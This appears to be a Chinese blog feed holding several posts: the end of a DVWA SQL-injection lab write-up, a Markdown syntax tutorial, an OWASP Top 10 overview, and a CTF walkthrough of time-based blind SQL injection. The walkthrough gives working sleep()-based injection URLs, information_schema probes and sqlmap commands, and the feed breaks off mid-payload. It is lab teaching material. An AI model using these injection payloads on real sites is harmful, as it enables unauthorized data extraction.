class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">        $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">            $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>过滤函数：</strong><br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">stripslashes()</a> 函数删除由 addslashes() 函数添加的反斜杠。<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a> 函数转义 SQL 语句中使用的字符串中的特殊字符。<br><a href="https://www.w3cschool.cn/php/php-is_numeric.html" target="_blank" rel="noopener">is_numeric()</a>— 检测变量是否为数字或数字字符串<br><strong>相关函数</strong><br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。</p></blockquote><blockquote><p>大概讲一下，这个代码，判断了输入的id是否是数字类型，stripslasher()删除了addslashes()的函数添加的反斜杠，这样我就不会绕过了。查证之后，发现high级别开启了php的magic_quotes_gpc，所以这里只是告诉了我们怎么防止sql注入，能不能绕过，就看大佬们愿不愿意贡献自己的秘籍了。</p></blockquote><h2 id="解释疑点"><a href="#解释疑点" class="headerlink" title="解释疑点"></a>解释疑点</h2><p>为什么要加#</p><blockquote><p>#的作用是闭合引号，注释字符,比如我们输入命令<code>1’ union select 1,2 #</code>  这里1’会报错，是由于check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1，为了解决报错，我们需要加一个# 注释掉后面多余的引号。</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://yoursite.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="DVWA" scheme="http://yoursite.com/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>Markdown编辑器语法</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/Markdown%E8%AF%AD%E6%B3%95%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/Markdown语法介绍/</id>
    <published>2019-10-04T03:11:27.000Z</published>
    <updated>2019-10-04T03:11:48.625Z</updated>
    
    <content type="html"><![CDATA[<p>Markdown是一种轻量级标记语言,它允许人们“使用易读易写的纯文本格式编写文档，然后转换有效的XHTML或者HTML文档”，这种语言吸收了很多电子邮件中已有的纯文本标记的特性。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="为什么要写博客"><a href="#为什么要写博客" class="headerlink" title="为什么要写博客"></a>为什么要写博客</h2><ul><li>先谈论一个话外题，为什么选择写博客，我认为写博客也是一种进步，可以温故，而在你复习的时候又会查阅一些资料，可以知新。</li></ul><h2 id="为什么选择Markdown"><a href="#为什么选择Markdown" class="headerlink" title="为什么选择Markdown"></a>为什么选择Markdown</h2><ul><li>维基百科介绍:Markdown是一种轻量级标记语言,它允许人们“使用易读易写的纯文本格式编写文档，然后转换有效的XHTML或者HTML文档”，这种语言吸收了很多电子邮件中已有的纯文本标记的特性。</li><li>它的优点可以概括为 ”轻量”，“易读易写”，“兼容性强”。</li></ul><h1 id="Markdown语法介绍"><a href="#Markdown语法介绍" class="headerlink" title="Markdown语法介绍"></a>Markdown语法介绍</h1><ul><li>刚开始写博客，好多东西不太清楚，还望大家谅解，如果有不正确的地方还请大家不要嫌弃，欢迎指出问题，这篇文章适合新手阅读，我也是刚开始学习Markdown语法，希望之后可以互相交流。</li></ul><blockquote><p>编写软件: Atom</p></blockquote><h1 id="基本技巧"><a href="#基本技巧" class="headerlink" title="基本技巧"></a>基本技巧</h1><blockquote><p>重点提示：在命令之后必须有空格，否则不识别你的命令</p></blockquote><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><blockquote><p>在markdown中#的个数代表几级标题。  </p></blockquote><blockquote><p>举例</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><blockquote><p>编辑器中显示如下图</p></blockquote><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><blockquote><p>普通引用 <code>&gt;</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">&gt; 划水划水划水水</span><br></pre></td></tr></table></figure><blockquote><p>显示为：<br>划水划水划水水</p></blockquote><h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><ol><li><p>高亮某个函数名或关键字,可以使用函数`print `实现</p><blockquote><p>输入`print`</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`print`</span><br></pre></td></tr></table></figure></li><li><p>高亮某个代码片段，可以用```包裹代码，并指定一种语言</p><blockquote><p>输入<br>```java<br>print(“hello,world”);<br>```</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"hello,world"</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用4空格缩进高亮代码，效果类似于方法 2</p><blockquote><p>我发现自己是4个Tab或者8个空格才搞定。</p><pre><code>print(&quot;hello,world&quot;);</code></pre></blockquote></li></ol><h2 id="粗体斜体"><a href="#粗体斜体" class="headerlink" title="粗体斜体"></a>粗体斜体</h2><blockquote><p>Markdown 的粗体和斜体使用简单的命令就可以搞定，<br>1 使用两个<code>**</code>包含文本就是粗体<br>2 使用一个<code>*</code>包含文本就是斜体<br>3 使用<code>***</code>包含文本就是粗体加斜体</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">*ST0new* **ST0new**  </span><br><span class="line">*若问使君才与术*，**何如？占得人间一味愚。**</span><br></pre></td></tr></table></figure><blockquote><p>输出<br><em>ST0new</em> <strong>ST0new</strong> <strong><em>ST0new</em></strong><br><em>若问使君才与术</em>，<strong>何如？</strong>?<strong><em>占得人间一味愚</em></strong>。</p></blockquote><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>常用链接方法</p><blockquote><p>1 文字连接 <code>[链接名称](https://链接网址)</code>  </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举例</span><br><span class="line">输入：[ST0new的博客](https://ST0new.github.io)</span><br></pre></td></tr></table></figure><blockquote><p>显示为：<a href="https://ST0new.github.io" target="_blank" rel="noopener">ST0new的博客</a>  </p></blockquote><blockquote><p>2 网址链接 <code>&lt;http://链接地址&gt;</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举例</span><br><span class="line">输入：&lt;https://ST0new.github.io&gt;</span><br></pre></td></tr></table></figure><blockquote><p>显示为： <a href="https://ST0new.github.io" target="_blank" rel="noopener">https://ST0new.github.io</a></p></blockquote><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><blockquote><p>插入图片<code>![](图片链接地址)</code></p></blockquote><blockquote><p>将图片放在链接后面 由于两者比较相似，具有对比性</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举例 放一张我们学校的美图</span><br><span class="line">输入：![](http://jjc.www.sust.edu.cn/images/17/11/18/1xz40sy10n/111044_2345.JPG)</span><br></pre></td></tr></table></figure><blockquote><p>显示为： <img src="http://jjc.www.sust.edu.cn/images/17/11/18/1xz40sy10n/111044_2345.JPG" alt></p></blockquote><blockquote><p>这里提示一下，图片可以是网络中的，或者是本地的，本地可以引用绝对地址和相对地址，但是都不比较保险，图片的位置变动会导致图片失效，建议大家设置图床更加保险。</p></blockquote><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>普通无序列表  <code>*</code> <code>+</code> <code>-</code>三种格式都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">- 样式一</span><br><span class="line">+ 样式二</span><br><span class="line">* 样式三</span><br></pre></td></tr></table></figure><blockquote><p>显示为</p></blockquote><ul><li>样式一</li></ul><ul><li>样式二</li></ul><ul><li>样式三</li></ul><p>普通有序列表 用<code>数字</code>表示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">1. 样式一</span><br><span class="line">2. 样式二</span><br><span class="line">7. 样式三 #这里写一个错误的数字，仔细观察显示</span><br></pre></td></tr></table></figure><blockquote><p>显示为</p></blockquote><ol><li>样式1</li><li>样式2</li><li>样式三</li></ol><blockquote><p>这里提示 这里有两个贴心的帮助。<br>1 它会自动为你添加数字<br>2 它会帮你修改错误的数字</p></blockquote><p>列表嵌套</p><blockquote><p>1 列表的多段换行需要四个空格<br>2 列表里的引用也需要加四个空格，在<code>&gt;</code><br>3 列表里的代码段也是要加四个空格在按照代码语法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">1. A</span><br><span class="line">    - B</span><br><span class="line">        1. C</span><br><span class="line">        - 前面加四个空格</span><br><span class="line">2. 多段换行</span><br><span class="line">    - 加四个空格</span><br><span class="line">3. 列表的引用</span><br><span class="line">    四个空格</span><br><span class="line">    &gt;前面空一行，在&gt;之后需要四个空格</span><br><span class="line">4. 列表里的代码段</span><br><span class="line"></span><br><span class="line">    ```语言</span><br><span class="line">    前面四个空格</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>如果想要另起一行，只需要在结尾加两个空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">我想换行[空格][空格]</span><br><span class="line">我不想换行了</span><br></pre></td></tr></table></figure><blockquote><p>显示为：我想换行<br>我不想换行了</p></blockquote><h2 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h2><p>如果你想有分割线，那么新起一行输入三个减号<code>---</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">---</span><br><span class="line">分割线下</span><br></pre></td></tr></table></figure><hr><p>分割线下</p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>表格定义为 <code>| xx | xx | xx |</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">|  编号  |  姓名  |  技能  |    评分  |</span><br><span class="line">|:--------:|-------  |----------|---:|</span><br><span class="line">|  001  |  张三   |  写作  |  93   |</span><br><span class="line">|  002  |  李四   |  学习  |  97   |</span><br><span class="line">|  003  |  王五   |  社交  |  96   |</span><br><span class="line">|  004  | ST0new|  篮球  |  90   |</span><br></pre></td></tr></table></figure><blockquote><p>这里注意在列和字段之间有还有一个|—|—|—|<br><code>:</code>的使用，只有左边为左对齐，只有右边为右对齐，两边都有为居中</p></blockquote><table><thead><tr><th align="center">编号</th><th>姓名</th><th>技能</th><th align="right">评分</th></tr></thead><tbody><tr><td align="center">001</td><td>张三</td><td>写作</td><td align="right">93</td></tr><tr><td align="center">002</td><td>李四</td><td>学习</td><td align="right">97</td></tr><tr><td align="center">003</td><td>王五</td><td>社交</td><td align="right">96</td></tr><tr><td align="center">004</td><td>ST0new</td><td>篮球</td><td align="right">90</td></tr><tr><td align="center">—</td><td></td><td></td><td align="right"></td></tr><tr><td align="center">## 结语：</td><td></td><td></td><td align="right"></td></tr><tr><td align="center">- 想要熟悉Markdown的语法还需要多加练习，希望这篇文章可以帮到你，</td><td></td><td></td><td align="right"></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Markdown是一种轻量级标记语言,它允许人们“使用易读易写的纯文本格式编写文档，然后转换有效的XHTML或者HTML文档”，这种语言吸收了很多电子邮件中已有的纯文本标记的特性。&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="语法" scheme="http://yoursite.com/tags/%E8%AF%AD%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>OWASP Top 10简要介绍</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/OWASP%20TOP%2010/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/OWASP TOP 10/</id>
    <published>2019-10-04T03:09:45.000Z</published>
    <updated>2019-10-04T03:11:01.726Z</updated>
    
    <content type="html"><![CDATA[<p>为了加深对owasp top 10 的印象 ，写一篇作为记录</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>最近在找实习，看到招聘全是要求熟悉<strong>OWASP Top 10</strong>,为了加深印象所以写一个博客记录一下 ,也希望可以为有相同需求的小伙伴提供好的资料,之后我会陆续更新相关的漏洞复现的博客，希望大家可以给我提出更好的建议。<br>版本：<a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf" target="_blank" rel="noopener">OWASP Top 10 2017</a></p></blockquote><h2 id="什么是OWASP-Top-10"><a href="#什么是OWASP-Top-10" class="headerlink" title="什么是OWASP Top 10"></a>什么是OWASP Top 10</h2><p>OWASP（开放式Web应用程序安全项目）的工具、文档、论坛和全球各地分会都是开放的，对所有致力于改进应用程序安全的人士开放，其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结了Web应用程序最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</p><h2 id="A1-注入injection"><a href="#A1-注入injection" class="headerlink" title="A1 注入injection"></a>A1 注入injection</h2><blockquote><p>将不安全的命令作为命令发送给解析器，会产生类似于<code>SQL注入、NoSQL注入、OS注入和LDAP注入</code>(<a href="https://baike.baidu.com/item/LDAP/2875565?fr=aladdin" target="_blank" rel="noopener">轻量目录访问协议</a>) 的缺陷，攻击者可以构造<code>恶意数据</code>通过注入缺陷的解析器执行没有权限的<code>非预期命令</code>或<code>访问数据</code>。</p></blockquote><h2 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 <strong>失效的身份认证</strong></h2><blockquote><p>通过错误使用应用程序的<code>身份认证</code>和<code>会话管理功能</code>，攻击者能够<code>破译密码</code>、<code>密钥</code>或<code>会话令牌</code>，或者<code>暂时</code>或<code>永久</code>的冒充其他用户的身份。</p></blockquote><h2 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h2><blockquote><p>这个比较好理解，一般我们的敏感信息包括<code>密码</code>、<code>财务数据</code>、<code>医疗数据</code>等，由于web应用或者API<code>未加密</code>或<code>不正确的保护敏感数据</code>，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</p></blockquote><h2 id="A4外部实体-XXE"><a href="#A4外部实体-XXE" class="headerlink" title="A4外部实体(XXE)"></a>A4外部实体(XXE)</h2><blockquote><p>XXE 全称为XML External Entity attack 即XML<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin" target="_blank" rel="noopener">(可扩展标记语言)</a> 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(<a href="https://baike.baidu.com/item/URI/16481812" target="_blank" rel="noopener">统一资源标识符</a>)文件处理器的<code>内部文件</code>和<code>共享文件</code>、<code>监听内部扫描端口</code>、<code>执行远程代码</code>和实施<a href="https://baike.baidu.com/item/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/421896?fr=aladdin" target="_blank" rel="noopener">拒绝服务攻击</a>。</p></blockquote><h2 id="A5失效的访问控制"><a href="#A5失效的访问控制" class="headerlink" title="A5失效的访问控制"></a>A5失效的访问控制</h2><blockquote><p>通过<code>身份验证</code>的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，eg:<code>访问用户的账户</code>、<code>敏感文件</code>、<code>获取和正常用户相同的权限</code>等.</p></blockquote><h2 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h2><blockquote><p>安全配置错误是比较常见的漏洞，由于操作者的<code>不当配置</code>(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</p></blockquote><h2 id="A7-跨站脚本（xss）"><a href="#A7-跨站脚本（xss）" class="headerlink" title="A7 跨站脚本（xss）"></a>A7 跨站脚本（xss）</h2><blockquote><p>xss攻击全称为<a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin" target="_blank" rel="noopener">跨站脚本攻击</a>,当应用程序的新网页中包含<code>不受信任的</code>、<code>未经恰当验证</code>、<code>转义的数据</code>或可以使用<code>HTML、JavaScript的浏览器API更新的现有网页</code>时，就会出现xss漏洞，跨站脚本攻击是<code>最普遍</code>的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。</p></blockquote><h2 id="A8不安全的反序列化"><a href="#A8不安全的反序列化" class="headerlink" title="A8不安全的反序列化"></a>A8不安全的反序列化</h2><blockquote><p>不安全的反序列化可以导致<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2491231?fr=aladdin" target="_blank" rel="noopener">远程代码执行</a>、<a href="https://baike.baidu.com/item/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB?fromtitle=%E9%87%8D%E6%92%AD%E6%94%BB%E5%87%BB&fromid=19455997" target="_blank" rel="noopener">重放攻击</a>、注入攻击或特权升级攻击</p></blockquote><h2 id="A9使用含有已知漏洞的组件"><a href="#A9使用含有已知漏洞的组件" class="headerlink" title="A9使用含有已知漏洞的组件"></a>A9使用含有已知漏洞的组件</h2><blockquote><p><a href="https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6/6902128?fr=aladdin" target="_blank" rel="noopener">组件</a>(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。</p></blockquote><h2 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h2><blockquote><p>这个和等保有一定的关系，不作介绍，不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。</p></blockquote><hr><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>大概了解了top 10的相关漏洞，对于漏洞有了一个大概的认识，接下来就是去多实际操作，去熟悉漏洞的相关特性，有助于您更好的了解这些漏洞。</p><p>参考文章：<br><a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf" target="_blank" rel="noopener">OWASP Top 10 2017</a><br><a href="https://www.freebuf.com/news/152207.html" target="_blank" rel="noopener">三分钟了解OWASP TOP 10 2017 RC2</a><br><a href="https://www.cnblogs.com/cn-36/p/6723536.html" target="_blank" rel="noopener">浅谈OWASP TOP 10</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为了加深对owasp top 10 的印象 ，写一篇作为记录&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="漏洞描述" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入(时间盲注)</title>
    <link href="http://yoursite.com/2019/10/04/CTF/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/SQL%E6%B3%A8%E4%BA%BA(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/"/>
    <id>http://yoursite.com/2019/10/04/CTF/墨者学院/SQL注人(时间盲注)/</id>
    <published>2019-10-04T03:08:21.000Z</published>
    <updated>2019-10-04T05:32:44.533Z</updated>
    
    <content type="html"><![CDATA[<p>了解盲注语法，如何利用盲注获取数据</p><a id="more"></a><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><ul><li>了解SQL时间盲注</li><li>掌握SQL注入语法</li><li>掌握SQL注入原理</li><li>了解SQL注入常用注释字符<blockquote><p>本题使用的工具<br>  sqlmap，hackbar<br>环境<br>  物理机：windows10<br>  虚拟机：kali</p></blockquote><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h2 id="1-判断是否存在盲注"><a href="#1-判断是否存在盲注" class="headerlink" title="1 判断是否存在盲注"></a>1 判断是否存在盲注</h2></li></ul><p>可以发现判断有多种方式，只要能保证sleep()执行，就可以根据回显的时间判断是否存在时间注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令1 ：http:/ip/flag.php?type=1 and sleep(5) &apos;</span><br><span class="line">命令2：http://ip/flag.php?type=1 and if(ascii(substr(database(),1,1))=114,1,sleep(5))&apos;</span><br><span class="line">命令3：http://ip/flag.php?type=1 and if(1=0,1,sleep(10)) --</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190610234646882.png" alt="在这里插入图片描述">发现存在明显的延迟，说明存在时间注入，这里我采取的做法是盲注，最后发现存在回显，也可以直接获取，就不多叙述了。</p><h2 id="2-获取数据库"><a href="#2-获取数据库" class="headerlink" title="2 获取数据库"></a>2 获取数据库</h2><ul><li><p>猜解数据库长度<br>  测试数据库的长度，当12时发生时间注入</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(length(database())=12,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>  <img src="https://img-blog.csdnimg.cn/20190610235206646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>猜解数据库名<br>  解释几个函数的用法<br>  1 <code>database()</code>： 获取数据库<br>  2 <code>substr()</code>：截取字符串函数<br>  用法：substr(string string,num start,num length);<br>  string为字符串；<br>  start为起始位置；<br>  length为长度。<br>  3 <code>ascii()</code>：返回字符串str的最左面字符的ASCII代码值<br>  4 <code>if(语句1，语句2，语句3)</code> ：如果语句1正确执行语句2，否则执行语句3</p><p>  第一位 112 对应 p<br>  使用注入语句<strong>if(ascii(substr(database(),1,1))</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(ascii(substr(database(),1,1))=112,sleep(5),1) --+</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/20190611000422360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">    剩下的交给sqlmap去跑<br>命令：<code>sqlmap -u url --dbs</code><br><img src="https://img-blog.csdnimg.cn/20190611000446519.png" alt="在这里插入图片描述">## 3 猜解表</p><ul><li><p>1 猜解表的长度<br>  这里都是猜解的最终flag的表和数据库<br>  发现在当长度为4 时发生延时</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4,sleep(5),1) --</span><br></pre></td></tr></table></figure></li><li><p>2 猜解表</p><ul><li>通过ascii去判断<br>判断第一位是否是字母<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:40472/flag.php?type=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))&gt;96,sleep(5),1) --</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>当前数据库的第三张表的第一个字符为f</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))&gt;102,sleep(5),1) --</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190611001117514.png" alt="在这里插入图片描述">    *  使用left去猜解<br>    <code>left(str,length)</code> ：LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if (left((select table_name from information_schema.tables where table_schema=database() limit 